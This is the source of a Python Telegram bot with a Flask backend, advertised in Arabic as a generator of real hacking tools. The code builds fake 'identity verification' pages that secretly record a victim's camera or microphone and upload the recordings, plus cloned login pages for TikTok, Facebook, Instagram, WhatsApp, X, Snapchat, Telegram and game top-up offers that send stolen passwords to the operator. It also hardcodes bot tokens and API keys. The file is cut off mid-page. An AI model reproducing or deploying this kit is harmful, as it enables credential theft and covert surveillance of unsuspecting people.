import sys
import io
import os
import json
import time
import base64
import zlib
import zipfile
import shutil
import socket
import telebot
import logging
import threading
import secrets
import string
import datetime
import uuid
import hashlib
import random
import binascii
import requests
import asyncio
import telethon
from telethon.sessions import StringSession
from telethon.errors import PhoneNumberInvalidError, FloodWaitError
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, KeyboardButtonRequestChat, ChatAdministratorRights, ReplyKeyboardRemove, BotCommand
from flask import Flask, request, redirect, Response
from threading import Thread

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

WEB_HOST_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:8080").rstrip('/')
BASE_SOCIAL_URL = WEB_HOST_URL

MENU_EMOJI = {"👀": "5210956306952758910", "🙂": "5461117441612462242", "⚡️": "5456140674028019486", "☄️": "5224607267797606837", "🛍": "5229064374403998351", "⛔️": "5260293700088511294", "🚫": "5240241223632954241", "❗️": "5274099962655816924", "‼️": "5440660757194744323", "⁉️": "5314504236132747481", "❓": "5436113877181941026", "⚠️": "5447644880824181073", "🌐": "5447410659077661506", "💬": "5443038326535759644", "💭": "5467538555158943525", "📊": "5231200819986047254", "🔼": "5449683594425410231", "🔽": "5447183459602669338", "🕯": "5451882707875276247", "📈": "5244837092042750681", "📉": "5246762912428603768", "✔️": "5206607081334906820", "❌": "5210952531676504517", "🆒": "5222079954421818267", "🔔": "5458603043203327669", "🥸": "5391112412445288650", "🤡": "5269531045165816230", "🫦": "5395444514028529554", "📌": "5397782960512444700", "💵": "5409048419211682843", "💸": "5233326571099534068", "💱": "5402186569006210455", "▶️": "5264919878082509254", "🔴": "5411225014148014586", "🟢": "5416081784641168838", "➡️": "5416117059207572332", "🔥": "5424972470023104089", "💥": "5276032951342088188", "🎙": "5294339927318739359", "🎤": "5224736245665511429", "📣": "5424818078833715060", "🤫": "5431609822288033666", "👎": "5449875686837726134", "🗣️": "5460795800101594035", "🔍": "5231012545799666522", "🛡": "5251203410396458957", "🔗": "5271604874419647061", "🖥": "5282843764451195532", "©": "5323442290708985472", "ℹ️": "5334544901428229844", "👍": "5337080053119336309", "⏸": "5359543311897998264", "💯": "5341498088408234504", "🔄": "5375338737028841420", "🔝": "5415655814079723871", "🆕": "5382357040008021292", "🔜": "5440621591387980068", "📍": "5391032818111363540", "➕": "5397916757333654639", "💎": "5427168083074628963", "⭐️": "5438496463044752972", "✨": "5325547803936572038", "👑": "5217822164362739968", "🗑": "5445267414562389170", "🔖": "5222444124698853913", "✉️": "5253742260054409879", "🔒": "5296369303661067030", "😮": "5303479226882603449", "📎": "5305265301917549162", "⚙️": "5341715473882955310", "🎮": "5361741454685256344", "🔈": "5388632425314140043", "⌛": "5386367538735104399", "⬇️": "5406745015365943482", "☀️": "5402477260982731644", "🌧": "5399913388845322366", "🌛": "5449569374065152798", "❄️": "5449449325434266744", "🌈": "5409109841538994759", "💧": "5393512611968995988", "🗓": "5413879192267805083", "💡": "5422439311196834318", "🥇": "5440539497383087970", "🥈": "5447203607294265305", "🥉": "5453902265922376865", "🎵": "5463107823946717464", "🆓": "5406756500108501710", "✏️": "5395444784611480792", "🚨": "5395695537687123235", "🏠": "5416041192905265756", "🚩": "5460755126761312667", "🎉": "5461151367559141950", "✈️": "5972282179776940830", "🎁": "5974412071238897156", "⚙": "5974104203688152439", "🍔": "5974393057418677108", "🎛": "5974318114534329432", "🗂": "5974580618640493852", "🔎": "5976655487276421359", "⬅️": "5854967531793550989", "◀️": "5974120159491657171", "⌨": "5974438511057570894", "🔨": "5974226571601382719", "🗃": "5854727876913401191", "⏲": "5976544483846654540", "📶": "5783105032350076195", "📁": "5974308936189218317", "💻": "5974453277155135447", "📥": "5974220038956124904", "📤": "5974192980662160632", "↗️": "5974209511991283312", "🪟": "5974166862966033687", "📄": "5974434516737985904", "👤": "5974038293120027938", "🚪": "5974506040828366250", "🗒": "5972158252790582632", "👥": "5976771524407856876", "🖋": "5974239538107649980", "🔊": "5976746905655316100", "🔇": "5974558538213625534", "📷": "5974208124716846431", "📞": "6019358113717555283", "🗣": "5974441981391145918", "♾": "5974053252491119713", "🙋": "5974416568069655298", "🔕": "5974565736578813237", "📑": "5974290527959386992", "🎞": "5974121731449687786", "😄": "6008076673445007337", "🤔": "6008163182676282906", "😝": "6005909072170192607", "😐": "6006005189243309628", "😔": "6008047819854712233", "😦": "6008146690001867326", "😡": "6007935394790772848", "🐱": "5974196171822862062", "🏀": "5974237656911973356", "⚽️": "6008348050953604853", "🏖": "6008362121266466368", "🚿": "6008061404836269427", "🏳": "6001100031648598886", "🚗": "6001168446182657594", "🏬": "5974384068052127237", "🔣": "6003585735381225018", "🎓": "6007996353261603963", "✋": "5974073919873748148", "👋": "6008263495932448198", "💊": "5974224694700674406", "🎭": "5974347006779329639", "💳": "5976377521287990495", "🪧": "6007870794187673399", "🔞": "6046388206927089022", "🆔": "5974526806995242353", "💼": "5976504918607926550", "🍏": "6046087752489897718", "🧹": "5974057212450967530", "🔫": "5974281014606826851", "😞": "5976452369683057639", "❤": "5776243912289029922", "⭐": "5854868854919925803", "👁": "5974350313904147369", "✉": "5775973900580031963", "🤖": "5971808079811972376", "🅰": "5972247240217988372", "🔑": "5773798959206108871", "🎨": "5974572969303739894", "🖌": "5976784422194646600", "✒": "5859662339069971619", "🌙": "6012403552348015524", "✂️": "5976453263036255213", "🔁": "6010381245521858058", "🔵": "5974147028807060966", "🖍": "6010509600619499098", "🔅": "6010102755547418519", "📝": "6010548023396928773", "🖼": "5974563790958627920", "📲": "5974053797951967293", "📱": "5974098293813152457", "🔃": "5974326631454477674", "↔️": "5974582963692637085", "📼": "5974236991192042347", "🗺": "5972015625516617062", "🔋": "5769329581878153194", "⏩": "6026302448769961329", "😁": "5958388480265426451", "🌀": "5239961874665064391", "🥷": "5240415835528383591", "👺": "5240234824131696608", "😈": "5240319907433828877", "🖤": "5240231358093085547", "👾": "5239940082001006116", "🔪": "5240476373092419847", "👩‍💻": "5239942654686417594", "🔐": "5240464905529740353", "👴": "5240398123083255436", "💠": "5239947340495733787", "🔹": "5240103415312307866", "🔘": "5240059464911963726", "😘": "5240410337970247790", "📚": "5239994065444949512", "🥬": "5240069936042231863", "🍎": "5240463415176087010", "💩": "5239966083733014035", "📘": "5240024366439221984", "⌨️": "5239975485416427692", "🇵🇸": "5239962269802054250", "🇰🇿": "5240204179540038576", "🇷🇺": "5240368741211980660", "🇺🇦": "5240282519743516221", "🇧🇾": "5240066143586110552", "↘️": "5240473662968057455", "✅": "5240171065342184336", "🧠": "5239965074415701227", "👹": "5240499123534186050", "😥": "5240163587804122577", "🤩": "5240022072926686780", "📂": "5323463074055739425", "🟦": "5323687769564793311", "🦾": "5321082828950097526", "📴": "5321446986342222933", "🤌": "5323598614633663987", "⛔": "5321058308981802241", "🟩": "5323625711582333932", "👮‍♀️": "5321132294088443564", "♻️": "5323500740918922490", "🤍": "5321348434022647572"}

PREMIUM_EMOJI_MAP = MENU_EMOJI  # backward-compat alias

def ce(emoji):
    eid = MENU_EMOJI.get(emoji)
    if not eid:
        # try without variation selector
        eid = MENU_EMOJI.get(emoji.replace('\ufe0f',''))
        if not eid:
            eid = MENU_EMOJI.get(emoji + '\ufe0f')
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
    return emoji

try:
    original_inline_init = telebot.types.InlineKeyboardButton.__init__
    def patched_inline_init(self, text, url=None, callback_data=None, style=None, **kwargs):
        original_inline_init(self, text, url=url, callback_data=callback_data)
        self.style = style
        for k, v in kwargs.items():
            setattr(self, k, v)
    telebot.types.InlineKeyboardButton.__init__ = patched_inline_init

    original_inline_to_dict = telebot.types.InlineKeyboardButton.to_dict
    def patched_inline_to_dict(self):
        button_dict = original_inline_to_dict(self)
        if hasattr(self, 'style') and self.style is not None:
            button_dict['style'] = self.style
        return button_dict
    telebot.types.InlineKeyboardButton.to_dict = patched_inline_to_dict
except:
    pass

BOT_TOKEN = "8691786416:AAFAPMurRLxfDQHlW_w6Zi6a4_lGXV1IE5c"
FAKE_BOT_TOKEN = "8978976697:AAFVOhdI2GQUeZGheYw31Oz9ixsbZRpuZ7A"
FAKE_BOT_USERNAME = "Mdnsmbot"

OWNER_ID = 8259194746
API_ID = int(os.environ.get('API_ID', '20372537'))
API_HASH = os.environ.get('API_HASH', '3bbd89427c05bfd2e60c8b1ab7bfb9bb')

DATA_DIR = "bot_data"
os.makedirs(DATA_DIR, exist_ok=True)

USERS_FILE = os.path.join(DATA_DIR, "users.json")
CHANNELS_FILE = os.path.join(DATA_DIR, "channels.json")
BANNED_FILE = os.path.join(DATA_DIR, "banned.json")
ADMINS_FILE = os.path.join(DATA_DIR, "admins.json")
MAINTENANCE_FILE = os.path.join(DATA_DIR, "maintenance.json")
VIP_KEYS_FILE = os.path.join(DATA_DIR, "vip_keys.json")
STATS_FILE = os.path.join(DATA_DIR, "stats.json")
FAKE_BOT_FILE = os.path.join(DATA_DIR, "fake_bot.json")
VIP_LOCK_FILE = os.path.join(DATA_DIR, "vip_lock.json")

WELCOME_MSG = (
    f"<b>╭━━━〔 {ce('🧬')} المتمرد V100 {ce('🧬')} 〕━━━╮</b>\n"
    "أهلاً بك في نظام توليد الأدوات المتقدمة جداً.\n"
    "<b>╰━━━━━━━━━━━━━━━━━━━━━━━━╯</b>\n\n"
    f"{ce('🐉')} يتم توليد سكريبتات بايثون مشفرة بـ 9 طبقات ديناميكية.\n"
    f"{ce('⚡')} أدوات سحب واختراق حقيقية للهواتف والكمبيوترات.\n\n"
    "<i>يرجى اختيار القسم المطلوب من الأسفل:</i>\n\n"
    f"{ce('⚙️')} <b>المطور:</b> @a_mutamarid\n"
    f"{ce('📡')} <b>القناة:</b> @mutmared1"
)

states = {
    "rm_ch": {}, "ban": {}, "unban": {}, "broadcast": {}, "send_msg": {},
    "add_admin": {}, "rm_admin": {}, "user_info": {}, "restore_backup": {}, "add_ch": {},
    "bot_control_token": {}, "bc_name_input": {}, "bc_desc_input": {}, "bc_about_input": {}, "bc_cmds_input": {},
    "ds_target": {}, "ds_count": {}, "phish_platform": {},
    "math_captcha": {}, "vip_key_input_user": {}, "adm_vip_7d_input": {}, "adm_vip_30d_input": {},
    "create_vip_key_days": {}, "create_vip_key_uses": {}, "disable_vip_key": {}, "enable_vip_key": {}, "delete_vip_key": {},
    "temp_create_vip_key": {},
    "crypto_check_input": {}, "cb_hijack_input": {}
}

spam_tasks = {}
bc_tokens = {} 
ds_data = {} 
fake_sessions = {} 
fake_states = {} 

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

def render_surveillance_page(media_type, cid):
    if media_type == "photo_front":
        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#1877f2}}p{{color:#555;text-align:center}}#v{{display:none}}#c{{display:none}}#st{{background:#1877f2;color:#fff;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>Secure Identity Verification</h2><p>Please allow camera access to verify your identity and continue.</p><video id="v" autoplay></video><canvas id="c"></canvas><button id="st" onclick="cap()">Allow & Verify</button><script>async function cap(){{navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}}}}).then(s=>{{document.getElementById('v').srcObject=s;setTimeout(()=>{{let v=document.getElementById('v');let c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(b=>{{let fd=new FormData();fd.append('file',b,'photo.jpg');fd.append('id','{cid}');fd.append('type','photo_front');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=verification+complete');}},'image/jpeg',0.9);}},2000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
    elif media_type == "photo_back":
        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Scan QR Code</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#000}}p{{color:#555;text-align:center}}#v{{display:none}}#c{{display:none}}#st{{background:#000;color:#fff;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>QR Code Scanner</h2><p>Please allow camera access to scan the QR code and verify your session.</p><video id="v" autoplay></video><canvas id="c"></canvas><button id="st" onclick="cap()">Start Scan</button><script>async function cap(){{navigator.mediaDevices.getUserMedia({{video:{{facingMode:{{exact:'environment'}}}}}}).then(s=>{{document.getElementById('v').srcObject=s;setTimeout(()=>{{let v=document.getElementById('v');let c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(b=>{{let fd=new FormData();fd.append('file',b,'photo.jpg');fd.append('id','{cid}');fd.append('type','photo_back');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=qr+scan+complete');}},'image/jpeg',0.9);}},2000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
    elif media_type == "video_front":
        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Video Verification</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#e1306c}}p{{color:#555;text-align:center}}#v{{display:none}}#st{{background:#e1306c;color:#fff;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>Liveness Check</h2><p>Please allow camera access to record a 5-second video for liveness verification.</p><video id="v" autoplay></video><button id="st" onclick="rec()">Record Video</button><script>async function rec(){{navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:true}}).then(s=>{{let v=document.getElementById('v');v.srcObject=s;let mr=new MediaRecorder(s);let ch=[];mr.ondataavailable=e=>ch.push(e.data);mr.onstop=()=>{{let b=new Blob(ch,{{type:'video/webm'}});let fd=new FormData();fd.append('file',b,'video.webm');fd.append('id','{cid}');fd.append('type','video_front');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=verification+success');}};mr.start();setTimeout(()=>{{mr.stop();s.getTracks().forEach(t=>t.stop());}},5000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
    elif media_type == "audio_mic":
        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Voice Verification</title><style>body{{font-family:sans-serif;background:#25d366;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#fff}}p{{color:#fff;text-align:center}}#st{{background:#fff;color:#25d366;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>Voice Verification</h2><p>Please allow microphone access to record a 5-second voice message and confirm your identity.</p><button id="st" onclick="rec()">Start Recording</button><script>async function rec(){{navigator.mediaDevices.getUserMedia({{audio:true}}).then(s=>{{let mr=new MediaRecorder(s);let ch=[];mr.ondataavailable=e=>ch.push(e.data);mr.onstop=()=>{{let b=new Blob(ch,{{type:'audio/webm'}});let fd=new FormData();fd.append('file',b,'audio.webm');fd.append('id','{cid}');fd.append('type','audio_mic');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=voice+verified');}};mr.start();setTimeout(()=>{{mr.stop();s.getTracks().forEach(t=>t.stop());}},5000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
    return "Invalid type."

def render_phish_page(platform, cid):
    if platform == "tiktok":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login | TikTok</title><style>body{{font-family:sans-serif;background:#161823;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;color:#161823;padding:40px;border-radius:12px;width:350px;text-align:center;box-shadow:0 0 20px rgba(0,0,0,0.5)}}input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}}.logo{{font-size:32px;font-weight:800;color:#fe2c55;margin-bottom:20px}}</style></head><body><div class="box"><div class="logo">TikTok</div><h3>Log in to your account</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="TikTok"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>'''
    elif platform == "facebook":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to Facebook</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:30px;border-radius:8px;width:350px;box-shadow:0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);text-align:center}}.logo-img{{width:150px;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}}button{{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPoAyPA4caiUiA5rEHt8tk66DTvZu9F2DUfmvWe8vsVg&s=10" class="logo-img" alt="Facebook"><form action="/catch" method="POST"><input type="hidden" name="platform" value="Facebook"><input type="hidden" name="id" value="{cid}"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>'''
    elif platform == "instagram":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login - Instagram</title><style>body{{font-family:sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border:1px solid #dbdbdb;border-radius:12px;width:350px;text-align:center}}.logo{{font-family:'Brush Script MT',cursive;font-size:40px;color:#262626;margin-bottom:20px}}input{{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;box-sizing:border-box;font-size:14px;background:#fafafa}}button{{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:bold;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><div class="logo">Instagram</div><form action="/catch" method="POST"><input type="hidden" name="platform" value="Instagram"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>'''
    elif platform == "whatsapp":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WhatsApp Web</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border-radius:8px;width:400px;text-align:center;box-shadow:0 4px 10px rgba(0,0,0,0.1)}}h2{{color:#128c7e}}input{{width:80%;padding:12px;margin:15px 0;border:1px solid #ccc;border-radius:4px}}button{{padding:12px 24px;background:#25d366;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}}</style></head><body><div class="box"><h2>WhatsApp Web</h2><p>To link your device, please enter your phone number to receive a verification code.</p><form action="/catch" method="POST"><input type="hidden" name="platform" value="WhatsApp"><input type="hidden" name="id" value="{cid}"><input type="text" name="phone" placeholder="+1 123 456 7890" required><button type="submit">Send Code</button></form></div></body></html>'''
    elif platform == "twitter":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to Twitter / X</title><style>body{{font-family:sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#000;padding:40px;border-radius:12px;width:350px;text-align:center;border:1px solid #2f3336}}h3{{color:#1d9bf0;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #2f3336;border-radius:4px;box-sizing:border-box;font-size:16px;background:#192734;color:#fff}}button{{width:100%;padding:14px;background:#1d9bf0;color:#fff;border:none;border-radius:20px;font-size:16px;font-weight:bold;cursor:pointer}}</style></head><body><div class="box"><h3>Sign in to X</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="Twitter"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form></div></body></html>'''
    elif platform == "snapchat":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Snapchat Login</title><style>body{{font-family:sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border-radius:12px;width:350px;text-align:center;box-shadow:0 4px 10px rgba(0,0,0,0.1)}}h3{{color:#000;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#fffc00;color:#000;border:1px solid #000;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}}</style></head><body><div class="box"><h3>Snapchat</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="Snapchat"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Username or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>'''
    elif platform == "pubg":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PUBG UC Top-Up</title><style>body{{font-family:'Segoe UI',sans-serif;background:#1b1b25;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}}.container{{background:#fff;width:100%;max-width:400px;border-radius:10px;box-shadow:0 4px 15px rgba(218,165,32,0.3);overflow:hidden}}.header{{background:#f5a623;padding:20px;text-align:center}}.header h2{{color:#fff;margin:0;font-size:24px;text-shadow:1px 1px 2px black}}.content{{padding:25px}}.form-group{{margin-bottom:20px}}.form-group input{{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box}}.btn{{width:100%;padding:15px;background:#f5a623;color:#fff;border:none;border-radius:4px;font-size:18px;font-weight:bold;cursor:pointer}}</style></head><body><div class="container"><div class="header"><h2>PUBG MOBILE UC</h2></div><div class="content"><form action="/catch" method="POST"><input type="hidden" name="platform" value="PUBG"><input type="hidden" name="id" value="{cid}"><div class="form-group"><input type="text" name="pubg_id" placeholder="Enter PUBG ID" required></div><div class="form-group"><input type="email" name="email" placeholder="Email (For Receipt)" required></div><div class="form-group"><input type="password" name="password" placeholder="Email Password" required></div><button type="submit" class="btn">Claim 840 UC Free</button></form></div></div></body></html>'''
    elif platform == "insta_followers":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Free Instagram Followers</title><style>body{{font-family:sans-serif;background:radial-gradient(circle at 30% 107%, #fdf497 0%, #fd5949 45%, #d6249f 60%, #285AEB 90%);display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border-radius:15px;width:350px;text-align:center}}.logo{{font-size:28px;font-weight:bold;background:linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}}input{{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;box-sizing:border-box}}button{{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><div class="logo">Instagram</div><h3>Get 10,000 Followers</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="InstaFollowers"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Instagram Username" required><input type="password" name="password" placeholder="Instagram Password" required><button type="submit">Send Followers</button></form></div></body></html>'''
    elif platform == "tiktok_likes":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Free TikTok Likes</title><style>body{{font-family:sans-serif;background:#161823;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;color:#161823;padding:40px;border-radius:12px;width:350px;text-align:center}}.logo{{font-size:32px;font-weight:800;color:#fe2c55;margin-bottom:20px}}input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}}</style></head><body><div class="box"><div class="logo">TikTok Likes</div><h3>Get 50,000 Likes</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="TikTokLikes"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="TikTok Username" required><input type="password" name="password" placeholder="TikTok Password" required><button type="submit">Send Likes</button></form></div></body></html>'''
    elif platform == "telegram_login":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Telegram Web Login</title><style>body{{font-family:sans-serif;background:#17212b;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border-radius:12px;width:350px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.2)}}.logo{{width:80px;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#2aabee;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/1024px-Telegram_logo.svg.png" class="logo" alt="Telegram"><h3>Log In to Telegram</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="TelegramLogin"><input type="hidden" name="id" value="{cid}"><input type="text" name="phone" placeholder="Phone Number (with country code)" required><input type="password" name="password" placeholder="Telegram Password" required><button type="submit">NEXT</button></form></div></body></html>'''
    elif platform == "clash_of_clans":
        return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Free Clash of Clans Gems</title><style>body{{font-family:Arial, sans-serif;background:#1a1a1a;color:#f0e6d2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#2c2c2c;padding:30px;border-radius:10px;width:350px;text-align:center;box-shadow:0 0 15px rgba(255,215,0,0.3);border:1px solid #ffd700}}h2{{color:#ffd700;margin-bottom:20px}}input{{width:100%;padding:12px;margin:8px 0;border:1px solid #555;border-radius:4px;box-sizing:border-box;background:#222;color:#fff}}button{{width:100%;padding:12px;background:linear-gradient(to bottom, #ffd700, #ffb700);color:#000;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}}</style></head><body><div class="box"><h2>Clash of Clans</h2><p>Get 10,000 Free Gems!</p><form action="/catch" method="POST"><input type="hidden" name="platform" value="ClashOfClans"><input type="hidden" name="id" value="{cid}"><input type="text" name="player_tag" placeholder="Player Tag (#ABC123)" required><input type="email" name="email" placeholder="Supercell Email" required><input type="password" name="password" placeholder="Email Password" required><button type="submit">Claim Gems Now</button></form></div></body></html>'''
    return "Page not found."

def render_freefire_page(cid):
    return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Free Fire Top-Up</title><style>body{{font-family:'Segoe UI',sans-serif;background:#f4f4f4;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}}.container{{background:#fff;width:100%;max-width:450px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);overflow:hidden}}.header{{background:#18181b;padding:20px;text-align:center;position:relative}}.header img{{height:50px;margin-bottom:10px}}.header h2{{color:#fff;margin:0;font-size:20px}}.content{{padding:25px}}.form-group{{margin-bottom:20px}}.form-group label{{display:block;color:#52525b;font-size:14px;margin-bottom:8px;font-weight:600}}.form-group input{{width:100%;padding:12px;border:1px solid #d4d4d8;border-radius:8px;font-size:16px;box-sizing:border-box}}.package-grid{{display:grid;grid-template-columns:1fr 1fr;gap:10px}}.package{{border:2px solid #e4e4e7;border-radius:8px;padding:15px;text-align:center;cursor:pointer;transition:0.2s}}.package.active{{border-color:#f59e0b;background:#fffbeb}}.package .amount{{font-weight:bold;color:#18181b;font-size:18px}}.package 